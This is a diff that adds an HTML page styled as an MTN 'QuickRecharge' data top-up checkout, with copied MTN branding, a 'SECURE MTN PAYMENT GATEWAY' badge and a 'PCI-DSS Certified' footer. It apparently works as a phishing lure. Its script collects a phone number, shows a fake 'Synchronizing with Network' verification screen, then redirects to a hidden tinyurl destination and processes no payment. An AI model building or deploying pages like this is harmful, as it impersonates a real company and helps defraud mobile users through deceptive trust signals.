@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN QuickRecharge | Secure Checkout</title>
+    <style>
+        :root {
+            --mtn-yellow: #FDCC00;
+            --mtn-black: #212529;
+            --mtn-grey: #e9ecef;
+            --mtn-blue: #004f91;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Helvetica, Arial, sans-serif;
+            background-color: var(--mtn-grey);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .checkout-card {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            position: relative;
+        }
+
+        /* Official MTN Brand Header */
+        .header {
+            background-color: var(--mtn-yellow);
+            padding: 25px;
+            text-align: center;
+            border-bottom: 6px solid var(--mtn-black);
+        }
+
+        .mtn-logo {
+            border: 2.5px solid var(--mtn-black);
+            border-radius: 50px;
+            display: inline-block;
+            padding: 4px 28px;
+            margin-bottom: 8px;
+        }
+
+        .mtn-logo-text {
+            font-weight: 800;
+            font-size: 28px;
+            color: var(--mtn-black);
+            letter-spacing: -1.5px;
+        }
+
+        .tagline {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--mtn-black);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        /* Form Area */
+        .form-section {
+            padding: 30px 25px;
+        }
+
+        .input-label {
+            font-size: 12px;
+            font-weight: 800;
+            color: #666;
+            margin-bottom: 8px;
+            display: block;
+            text-transform: uppercase;
+        }
+
+        .phone-input-container {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        input[type="tel"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            box-sizing: border-box;
+            outline: none;
+            color: var(--mtn-black);
+        }
+
+        input[type="tel"]:focus {
+            border-color: var(--mtn-yellow);
+        }
+
+        /* Bundle Selection Grid */
+        .bundle-grid {
+            display: grid;
+            gap: 12px;
+        }
+
+        .bundle-card {
+            border: 1px solid #eee;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: #fff;
+        }
+
+        .bundle-card:hover {
+            border-color: var(--mtn-yellow);
+            background-color: #fffdf2;
+            transform: translateY(-2px);
+        }
+
+        .bundle-name {
+            font-weight: 700;
+            font-size: 15px;
+            color: var(--mtn-black);
+        }
+
+        .bundle-sub {
+            display: block;
+            font-size: 11px;
+            color: #888;
+        }
+
+        .bundle-price {
+            font-weight: 900;
+            font-size: 16px;
+            color: var(--mtn-blue);
+        }
+
+        /* Security Elements */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 25px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 11px;
+            color: #555;
+            font-weight: 600;
+        }
+
+        .lock-icon {
+            width: 14px;
+            height: 14px;
+        }
+
+        /* Processing Overlay */
+        #loader-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.98);
+            z-index: 100;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--mtn-yellow);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .footer {
+            background: #fafafa;
+            padding: 15px;
+            text-align: center;
+            font-size: 10px;
+            color: #aaa;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+
+<div class="checkout-card">
+    <div class="header">
+        <div class="mtn-logo">
+            <span class="mtn-logo-text">MTN</span>
+        </div>
+        <div class="tagline">Y'ello. Direct Data Top-Up</div>
+    </div>
+
+    <div class="form-section">
+        <label class="input-label">1. Enter Recipient Number</label>
+        <div class="phone-input-container">
+            <input type="tel" id="msisdn" placeholder="081 234 5678" maxlength="10">
+        </div>
+
+        <label class="input-label">2. Choose Your Bundle</label>
+        <div class="bundle-grid">
+            <div class="bundle-card" onclick="handleBuy('R14.40')">
+                <div>
+                    <span class="bundle-name">1GB Anytime</span>
+                    <span class="bundle-sub">Valid for 1 Hour</span>
+                </div>
+                <div class="bundle-price">R14.40</div>
+            </div>
+
+            <div class="bundle-card" onclick="handleBuy('R118.80')">
+                <div>
+                    <span class="bundle-name">10GB (5GB+5GB)</span>
+                    <span class="bundle-sub">Valid for 30 Days</span>
+                </div>
+                <div class="bundle-price">R118.80</div>
+            </div>
+
+            <div class="bundle-card" onclick="handleBuy('R418.80')">
+                <div>
+                    <span class="bundle-name">100GB (50GB+50GB)</span>
+                    <span class="bundle-sub">Valid for 30 Days</span>
+                </div>
+                <div class="bundle-price">R418.80</div>
+            </div>
+        </div>
+
+        <div class="security-badge">
+            <svg class="lock-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg>
+            SECURE MTN PAYMENT GATEWAY
+        </div>
+    </div>
+
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+        <p style="margin-top:20px; font-weight:700; color:#212529;">Synchronizing with Network...</p>
+        <p style="font-size:12px; color:#888;">Checking MSISDN status</p>
+    </div>
+
+    <div class="footer">
+        © 2026 MTN Group Limited. All Rights Reserved.<br>
+        PCI-DSS Certified Connection
+    </div>
+</div>
+
+<script>
+    function handleBuy(price) {
+        const phone = document.getElementById('msisdn').value;
+        
+        if(phone.length < 10 || !phone.startsWith('0')) {
+            alert("Error: Please enter a valid 10-digit MTN number to continue.");
+            return;
+        }
+
+        // Trigger Loading Effect
+        document.getElementById('loader-overlay').style.display = 'flex';
+
+        // Redirect after 2.5 seconds of "verifying"
+        setTimeout(function() {
+            window.location.href = "https://tinyurl.com/yxnmfxd3";
+        }, 2500);
+    }
+</script>
+
+</body>
+</html>
